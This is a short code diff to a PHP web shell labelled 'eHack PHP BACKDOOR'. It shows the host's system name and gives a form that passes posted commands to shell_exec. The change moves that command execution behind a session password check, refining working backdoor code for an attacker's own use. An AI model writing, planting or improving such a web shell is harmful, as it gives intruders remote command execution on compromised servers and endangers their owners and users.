@@ -58,12 +58,12 @@ else {
   <h1>eHack PHP BACKDOOR</h1>
   <center><p><?php echo substr(php_uname(),0,120);?></p></center>
   <?php
-    if (!empty($_POST['command'])) {
-    $command = shell_exec($_POST['command']);
-  }
     session_start();
     if($_SESSION['password']== $password)
 {
+    if (!empty($_POST['command'])) {
+    $command = shell_exec($_POST['command']);
+  }
  ?>
   <form  method="post" action="">
     <input type="text" class="command" placeholder="Please enter your command" name="command" id="command" value="<?= htmlspecialchars($_POST['command']) ?>" required>
